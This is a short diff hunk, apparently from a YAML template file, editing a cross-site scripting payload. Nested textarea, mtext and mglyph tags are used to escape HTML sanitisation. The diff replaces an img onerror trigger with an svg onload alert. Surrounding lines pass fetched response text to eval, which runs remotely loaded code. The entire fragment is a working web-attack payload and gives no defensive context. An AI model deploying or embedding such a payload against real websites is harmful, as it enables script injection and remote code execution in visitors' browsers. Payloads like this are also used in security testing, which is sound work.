@@ -13,7 +13,7 @@ info:
                   <textarea>
                     <a title='
                       </textarea></mtext></mglyph>
-                      <img src=x onerror=alert(document.domain))>
+                      <svg/onload=alert()>
                       .then(function(res){
                         res.text().then(function(data){
                           eval(data)
